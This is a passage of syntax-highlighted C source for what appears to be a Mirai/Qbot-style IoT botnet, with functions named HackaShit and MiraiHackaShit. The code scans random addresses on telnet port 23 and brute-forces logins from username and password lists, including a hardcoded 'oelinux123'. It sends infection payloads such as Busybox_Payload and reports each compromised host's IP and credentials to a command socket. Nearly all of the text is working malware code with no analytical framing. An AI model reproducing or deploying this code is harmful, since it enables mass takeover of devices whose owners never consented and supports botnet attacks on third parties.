class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">253</span>, phone)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">9</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;oelinux123\r\n&quot;</span>, <span class="number">12</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>: &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, phonepayload, <span class="built_in">strlen</span>(phonepayload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].complete = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">60</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete !=<span class="number">3</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HackaShit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	 <span class="keyword">int</span> max = <span class="number">256</span>, i, res, valopt;</span><br><span class="line">    fd_set fdset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> lon;</span><br><span class="line">	srand(time(<span class="literal">NULL</span>) ^ rand_cmwc());</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">    dest_addr.sin_family = AF_INET;</span><br><span class="line">    dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">    <span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> <span class="title">fds</span>[<span class="title">max</span>];</span></span><br><span class="line"><span class="built_in">memset</span>(fds, <span class="number">0</span>, max * (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].complete = <span class="number">1</span>; </span><br><span class="line">fds[i].sockbuf = <span class="built_in">malloc</span>(<span class="number">256</span> + <span class="number">1</span>); &#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout == <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>); &#125;</span><br><span class="line"><span class="keyword">switch</span>(fds[i].state) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete) &#123;</span><br><span class="line"><span class="keyword">char</span> *tmp = fds[i].sockbuf;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].sockbuf = tmp;</span><br><span class="line">fds[i].ip = HackerScan1(); &#125;</span><br><span class="line"><span class="keyword">else</span>  &#123;</span><br><span class="line">fds[i].passwordInd++;</span><br><span class="line">fds[i].usernameInd++;</span><br><span class="line"><span class="keyword">if</span>(fds[i].passwordInd == <span class="keyword">sizeof</span>(Telnet_Passwords) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *)) &#123;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].usernameInd == <span class="keyword">sizeof</span>(Telnet_Usernames) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *)) &#123;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">dest_addr.sin_addr.s_addr = fds[i].ip;</span><br><span class="line">fds[i].fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fds[i].fd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(connect(fds[i].fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)) == <span class="number">-1</span> &amp;&amp; errno != EINPROGRESS) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].complete = <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">1</span>;</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">FD_ZERO(&amp;fdset);</span><br><span class="line">FD_SET(fds[i].fd, &amp;fdset);</span><br><span class="line">tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">tv.tv_usec = <span class="number">10000</span>;</span><br><span class="line">res = select(fds[i].fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;fdset, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span>(res == <span class="number">1</span>) &#123;</span><br><span class="line">lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">valopt = <span class="number">0</span>;</span><br><span class="line">getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line"><span class="keyword">if</span>(valopt) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) &amp; (~O_NONBLOCK));</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">fds[i].bufUsed = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(fds[i].sockbuf, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">fds[i].state = <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">-1</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">256</span>, advances)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">3</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], <span class="built_in">strlen</span>(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">4</span>; &#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">256</span>, advances))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">5</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], <span class="built_in">strlen</span>(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line"><span class="keyword">if</span> (read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">256</span>, advances2)) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;\e[96m[TELNET] \e[97mFound And Infected A Telnet \e[96m[%s]&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;DICK %s:%s:%s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">fds[i].state = <span class="number">7</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>: &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line"><span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].complete = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">60</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete !=<span class="number">3</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MiraiHackaShit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">int</span> max = <span class="number">256</span>, i, res, valopt;</span><br><span class="line">fd_set fdset;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> lon;</span><br><span class="line">srand(time(<span class="literal">NULL</span>) ^ rand_cmwc());</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> <span class="title">fds</span>[<span class="title">max</span>];</span></span><br><span class="line"><span class="built_in">memset</span>(fds, <span class="number">0</span>, max * (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].complete = <span class="number">1</span>; </span><br><span class="line">fds[i].sockbuf = <span class="built_in">malloc</span>(<span class="number">256</span> + <span class="number">1</span>); &#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout == <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>); &#125;</span><br><span class="line"><span class="keyword">switch</span>(fds[i].state) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete) &#123;</span><br><span class="line"><span class="keyword">char</span> *tmp = fds[i].sockbuf;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].sockbuf = tmp;</span><br><span class="line">fds[i].ip = HackerScan1(); &#125;</span><br><span class="line"><span class="keyword">else</span>  &#123;</span><br><span class="line">fds[i].passwordInd++;</span><br><span class="line">fds[i].usernameInd++;</span><br><span class="line"><span class="keyword">if</span>(fds[i].passwordInd == <span class="keyword">sizeof</span>(Telnet_Passwords) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *)) &#123;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].usernameInd == <span class="keyword">sizeof</span>(Telnet_Usernames) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *)) &#123;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">dest_addr.sin_addr.s_addr = fds[i].ip;</span><br><span class="line">fds[i].fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fds[i].fd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(connect(fds[i].fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)) == <span class="number">-1</span> &amp;&amp; errno != EINPROGRESS) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].complete = <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">1</span>;</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">FD_ZERO(&amp;fdset);</span><br><span class="line">FD_SET(fds[i].fd, &amp;fdset);</span><br><span class="line">tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">tv.tv_usec = <span class="number">10000</span>;</span><br><span class="line">res = select(fds[i].fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;fdset, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span>(res == <span class="number">1</span>) &#123;</span><br><span class="line">lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">valopt = <span class="number">0</span>;</span><br><span class="line">getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line"><span class="keyword">if</span>(valopt) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) &amp; (~O_NONBLOCK));</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">fds[i].bufUsed = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(fds[i].sockbuf, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">fds[i].state = <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">-1</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">256</span>, advances)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">3</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], <span class="built_in">strlen</span>(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">4</span>; &#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">256</span>, advances))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">5</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], <span class="built_in">strlen</span>(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line"><span class="keyword">if</span> (read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">256</span>, advances2)) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;\e[96m[TELNET] \e[97mFound And Infected A Telnet \e[96m[%s]&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;DICK %s:%s:%s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">fds[i].state = <span class="number">7</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span 